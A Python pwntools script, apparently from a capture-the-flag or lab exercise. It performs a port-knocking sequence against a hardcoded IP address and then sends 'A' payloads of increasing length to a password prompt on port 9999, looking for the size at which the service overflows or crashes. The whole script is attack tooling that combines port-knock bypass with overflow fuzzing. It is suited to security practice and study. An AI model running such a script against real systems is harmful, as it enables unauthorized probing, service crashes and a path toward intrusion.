#!/usr/bin/env python3
"""
Detailed analysis of buffer overflow behavior
"""

from pwn import *
import time

context.log_level = 'warn'

target_ip = "13.206.58.35"
target_port = 9999

def knock_ports():
    sequence = [9000, 2600, 1337]
    for port in sequence:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target_ip, port))
            s.close()
        except:
            pass
        time.sleep(0.2)
    time.sleep(0.8)

def test_size(size, pattern=b"A"):
    try:
        knock_ports()
        conn = remote(target_ip, target_port, level='error')
        conn.recvuntil(b"password:")
        
        payload = pattern * size
        conn.sendline(payload)
        
        try:
            response = conn.recvall(timeout=2)
            conn.close()
            return len(response), response
        except:
            conn.close()
            return 0, b""
    except:
        return -1, b""

print("[*] Analyzing buffer overflow behavior\n")
print("Size | Response Length | Response Preview")
print("-" * 70)

# Test sizes from 1 to 300
interesting_sizes = []

for size in range(1, 300, 10):
    resp_len, resp = test_size(size)
    preview = resp[:50].decode('utf-8', errors='ignore').replace('\n', '\\n').replace('\r', '\\r')
    
    print(f"{size:4d} | {resp_len:15d} | {preview}")
    
    # Track interesting changes
    if resp_len != 50 and resp_len > 0:  # 50 is the normal "denied" response
        interesting_sizes.append((size, resp_len, resp))
    
    time.sleep(0.8)

if interesting_sizes:
    print(f"\n[!] Found {len(interesting_sizes)} interesting response(s):")
    for size, resp_len, resp in interesting_sizes:
        print(f"\n  Size {size}: {resp_len} bytes")
        print(f"  Response: {resp[:200]}")

# Now test around the crash point (we know ~200 causes issues)
print("\n[*] Fine-tuning around size 200...")
for size in range(190, 210):
    resp_len, resp = test_size(size)
    if resp_len != 50:
        print(f"  Size {size}: {resp_len} bytes - {resp[:100]}")
    time.sleep(0.8)

print("\n[*] Analysis complete")
